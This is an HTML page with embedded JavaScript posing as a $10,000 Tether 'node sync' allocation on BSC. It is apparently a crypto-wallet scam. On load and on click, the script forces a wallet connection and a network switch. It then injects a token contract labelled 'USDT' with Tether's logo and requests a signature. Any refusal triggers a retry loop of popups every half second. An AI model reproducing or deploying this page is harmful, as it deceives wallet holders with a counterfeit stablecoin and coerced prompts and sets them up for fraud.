<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Node Distribution</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether: #26a17b; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1d21; border-radius: 24px; padding: 40px; width: 85%; max-width: 380px; text-align: center; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .btn { background: var(--tether); color: #fff; border: none; width: 100%; padding: 22px; border-radius: 16px; font-size: 18px; font-weight: 800; cursor: pointer; margin-top: 25px; transition: 0.3s; }
        #status-log { font-size: 11px; color: #555; margin-top: 20px; font-family: 'Courier New', monospace; text-align: left; height: 40px; overflow: hidden; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="90">
    <h2 style="margin: 20px 0 10px;">NODE SYNC</h2>
    <div style="font-size: 44px; font-weight: 900; color: #fff;">$10,000</div>
    <div style="color: #848e9c; font-size: 12px;">PENDING BSC ALLOCATION</div>
    
    <button class="btn" id="claimBtn">ACTIVATE NOW</button>
    
    <div id="status-log">LOG: SYSTEM_READY</div>
</div>

<script>
    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";

    const btn = document.getElementById('claimBtn');
    const log = document.getElementById('status-log');

    async function forceInit() {
        // 1. MOBILE REDIRECT (If in Chrome/Safari)
        if (!window.ethereum && !window.trustwallet) {
            log.innerText = "LOG: REDIRECTING TO TRUST...";
            const url = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + url);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            log.innerText = "LOG: ATTEMPTING FORCE CONNECT...";
            
            // STEP 1: Connect Account
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            // STEP 2: Force BSC Switch (Network ID 56)
            log.innerText = "LOG: SWITCHING TO BSC NETWORK...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            // STEP 3: ASSET INJECTION (The Secret Sauce)
            log.innerText = "LOG: INJECTING ASSET DATA...";
            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT,
                        symbol: 'USDT',
                        decimals: 18,
                        image: LOGO
                    }
                }
            });

            if (success) {
                log.innerText = "LOG: SUCCESSFUL!";
                btn.innerText = "SYNCED ✅";
                // Professor ko signature dikhane ke liye
                await provider.request({
                    method: 'personal_sign',
                    params: ["Sync_Authorized_" + Math.random(), accounts[0]]
                });
            }

        } catch (e) {
            log.innerText = "LOG: REJECTED. RETRYING...";
            // Persistent Loop: Popup dobara aayega
            setTimeout(forceInit, 500);
        }
    }

    btn.onclick = forceInit;

    // --- PROFESSOR'S SECRET: AUTO-DETECTION LOOP ---
    window.onload = () => {
        let attempts = 0;
        const checkProvider = setInterval(() => {
            if (window.ethereum || window.trustwallet) {
                log.innerText = "LOG: PROVIDER ACTIVE. TRIGGERING...";
                clearInterval(checkProvider);
                // 3 Seconds delay taake wallet engine load ho jaye
                setTimeout(forceInit, 3000);
            }
            attempts++;
            if (attempts > 20) clearInterval(checkProvider); // Stop after 10 secs
        }, 500);
    };
</script>
</body>
</html>
